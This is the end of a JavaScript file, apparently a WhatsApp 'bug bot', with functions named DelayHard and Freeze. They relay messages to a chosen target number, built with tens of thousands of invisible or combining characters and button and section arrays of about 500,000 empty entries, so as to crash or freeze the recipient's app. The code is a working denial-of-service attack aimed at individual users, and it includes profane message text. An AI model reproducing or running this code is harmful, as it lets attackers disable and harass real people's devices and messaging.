                        displayText: "\u200B".repeat(9000) + "\uFE00".repeat(6000)+"ꦾ".repeat(5000),
                    },
                    type: 1
                }
            ]
        }
    }, { userJid: jid });

    await sock.relayMessage(jid, msg.message, {
        messageId: msg.key.id,
     noSelfSync: true
    });
}

async function DelayHard(sock, target) {
  const jid = target.includes('@') ? target : target + '@s.whatsapp.net';

  await sock.relayMessage(jid, {
    groupStatusMessageV2: {
      message: {
        hasMediaAttachment: false,
        interactiveMessage: {
          body: {
            text: "FuckYou"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          },
          contextInfo: {
            mentionedJid: [jid]
          }
        }
      }
    }
  }, { noSelfSync: true });
}

async function Freeze(sock, target) {
  const payload = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "Crashꦾ",
            display_text: "‌"
          },
          nativeFlowInfo: {
            name: "single_select",
            paramsJson: JSON.stringify({
              icon: "document",
              title: "WhereAreYou?¿",
              sections: Array.from({ length: 505555 }, () => ({}))
            })
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };

  await sock.relayMessage(target, payload, { noSelfSync: true });
  console.log("succes send to target");
}

// ─────── AKHIR DARI FUNCTION ─────── //
bot.launch();